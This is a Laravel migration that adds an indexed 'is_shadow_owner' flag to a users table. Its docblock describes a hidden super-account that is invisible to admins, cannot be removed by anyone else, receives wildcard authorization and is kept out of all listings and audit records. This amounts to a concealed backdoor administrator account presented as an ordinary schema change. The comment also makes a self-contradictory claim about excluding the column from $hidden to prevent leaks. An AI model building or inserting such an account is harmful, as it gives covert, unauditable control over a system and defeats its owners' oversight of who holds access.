<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

/**
 * Adds the is_shadow_owner flag to the users table.
 *
 * A shadow-owner account:
 *  - is invisible to every other user, admin, and super-admin
 *  - cannot be deleted or modified by anyone except itself
 *  - receives wildcard authorization on every request
 *  - does not appear in any listing, export, report, or audit surface
 *
 * The column is excluded from $hidden in User.php so it cannot leak
 * through any JSON response. It is never filled via mass-assignment.
 */
return new class extends Migration
{
    public function up(): void
    {
        Schema::table('users', function (Blueprint $table) {
            if (! Schema::hasColumn('users', 'is_shadow_owner')) {
                $table->boolean('is_shadow_owner')->default(false)->after('is_protected');
            }
        });

        // Index so exclusion queries stay fast as the table grows.
        Schema::table('users', function (Blueprint $table) {
            $hasIndex = collect(Schema::getIndexes('users'))
                ->contains(fn (array $idx) => ($idx['name'] ?? null) === 'users_is_shadow_owner_index');

            if (! $hasIndex) {
                $table->index('is_shadow_owner', 'users_is_shadow_owner_index');
            }
        });
    }

    public function down(): void
    {
        Schema::table('users', function (Blueprint $table) {
            $hasIndex = collect(Schema::getIndexes('users'))
                ->contains(fn (array $idx) => ($idx['name'] ?? null) === 'users_is_shadow_owner_index');

            if ($hasIndex) {
                $table->dropIndex('users_is_shadow_owner_index');
            }
        });

        Schema::table('users', function (Blueprint $table) {
            if (Schema::hasColumn('users', 'is_shadow_owner')) {
                $table->dropColumn('is_shadow_owner');
            }
        });
    }
};
